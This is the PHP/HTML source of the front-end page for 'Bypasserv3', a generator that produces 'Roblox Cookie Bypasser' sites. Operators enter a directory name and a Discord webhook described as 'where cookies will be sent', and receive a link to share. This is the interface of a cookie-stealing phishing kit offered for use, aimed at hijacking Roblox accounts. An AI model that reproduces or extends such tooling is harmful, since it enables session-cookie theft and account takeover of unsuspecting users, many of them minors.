<?php
/**
 * Bypasserv3 - Dualhook Generator
 * Modern Clean Blue/White Design
 */

require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Site - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #f0f5ff 0%, #e8f1ff 50%, #f0f5ff 100%);
            color: #1a2a4a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
        }
        
        .navbar {
            background: white;
            box-shadow: 0 2px 10px rgba(59, 130, 246, 0.1);
            padding: 20px 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        
        .navbar-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .navbar-brand {
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .back-button {
            padding: 8px 16px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .back-button:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: rgba(59, 130, 246, 0.4);
        }
        
        body {
            padding-top: 80px;
        }
        
        .glass-box {
            background: white;
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 2px 15px rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .header {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .header h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #3b82f6;
            font-family: 'Space Grotesk', sans-serif;
        }
        
        .header p {
            color: #64748b;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2a4a;
            margin-bottom: 10px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 10px;
            color: #1a2a4a;
            font-size: 14px;
            font-family: 'Outfit', sans-serif;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            background: white;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .form-group small {
            display: block;
            margin-top: 6px;
            font-size: 12px;
            color: #64748b;
        }
        
        .form-description {
            display: block;
            margin-top: 8px;
            font-size: 13px;
            color: #64748b;
            line-height: 1.5;
        }
        
        .btn-generate {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 12px;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
        }
        
        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
        }
        
        .btn-generate:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .success-container {
            text-align: center;
        }
        
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }
        
        .success-container h2 {
            font-size: 28px;
            margin-bottom: 12px;
            color: #10b981;
        }
        
        .success-info {
            background: rgba(16, 185, 129, 0.05);
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        
        .success-url {
            background: #f8fafc;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            color: #3b82f6;
            word-break: break-all;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <!-- Navbar -->
    <div class="navbar">
        <div class="navbar-content">
            <div class="navbar-brand">Bypasserv3</div>
            <a href="/" class="back-button">← Back Home</a>
        </div>
    </div>

    <div class="container">
        <div id="formContainer" class="glass-box">
            <div class="header">
                <h1>Create Your Site</h1>
                <p>Generate a custom Roblox Cookie Bypasser site in seconds</p>
            </div>

            <form id="generatorForm" onsubmit="return handleSubmit(event)">
                <div class="form-group">
                    <label>📁 Site Name (Directory)</label>
                    <input 
                        type="text" 
                        id="siteName" 
                        placeholder="e.g. myrefresher123"
                        maxlength="32"
                        required
                    />
                    <small>3-32 characters, letters, numbers, hyphens, underscores only</small>
                </div>

                <div class="form-group">
                    <label>📡 Discord Webhook URL</label>
                    <input 
                        type="text" 
                        id="masterWebhook" 
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    />
                    <span class="form-description">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</span>
                </div>

                <button type="submit" class="btn-generate">
                    <span>⚡</span>
                    Generate Site
                </button>
            </form>

            <div id="successContainer" class="success-container" style="display: none;">
                <div class="success-icon">✅</div>
                <h2>Site Created!</h2>
                <div class="success-info">
                    <p style="color: #64748b; margin-bottom: 12px;">Your site is ready. Share this link:</p>
                    <div class="success-url" id="generatedUrl"></div>
                </div>

                <button onclick="window.location.href = document.getElementById('generatedUrl').textContent" class="btn-generate" style="margin-bottom: 12px;">
                    <span>🚀</span>
                    Open Site
                </button>
                <button onclick="location.reload()" class="btn-generate" style="background: rgba(59, 130, 246, 0.1); color: #3b82f6; box-shadow: none;">
                    <span>🔄</span>
                    Create Another
                </button>
            </div>
        </div>
    </div>

    <script>
        async function handleSubmit(e) {
            e.preventDefault();

            const siteName = document.getElementById('siteName').value.trim();
            const masterWebhook = document.getElementById('masterWebhook').value.trim();

            if (!siteName || !masterWebhook) {
                Swal.fire({
                    icon: 'error',
                    title: 'Missing Fields',
                    text: 'Please fill in all required fields',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            if (siteName.length < 3) {
                Swal.fire({
                    icon: 'error',
                    title: 'Invalid Site Name',
                    text: 'Site name must be at least 3 characters',
                    confirmButtonColor: '#3b82f6'
                });
                return false;
            }

            const btn = document.querySelector('.btn-generate');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Generating...';

            try {
                const response = await fetch('/generator/create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        directory: siteName,
                        masterWebhook: masterWebhook,
                        userWebhook: masterWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('formContainer').style.display = 'none';
                    document.getElementById('successContainer').style.display = 'block';
                    document.getElementById('generatedUrl').textContent = data.publicUrl;

                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Your site has been created!',
                        confirmButtonColor: '#10b981'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to create site',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (err) {
                Swal.fire({
                    icon: 'error',
                    title: 'Network Error',
                    text: err.message,
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<span>⚡</span> Generate Site';
            }

            return false;
        }
    </script>
</body>
</html>
?>
